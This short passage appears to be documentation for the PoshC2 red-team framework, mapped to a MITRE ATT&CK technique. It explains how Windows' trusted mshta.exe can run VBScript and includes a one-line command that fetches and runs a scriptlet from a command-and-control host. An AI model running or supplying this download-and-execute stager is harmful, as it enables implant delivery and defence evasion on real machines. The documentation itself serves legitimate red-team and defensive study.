Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_

Mshta is an executable file which can be found on most Windows operating systems. Mshta is designed to run "HTA" files and help files on the host. However, Mshta can be used on the command line to run arbitrary vbscript. PoshC2 uses this to execute code from a remote web server. This utility has some benefits over other tools as its a trusted binary, proxy aware and supports HTTPS. 

Mshta do not work with untrusted SSL certificates if using over HTTPS:

.. code-block:: python

	mshta.exe vbscript:GetObject("script:https://www.c2.com/news/j9hau_cs")(window.close)
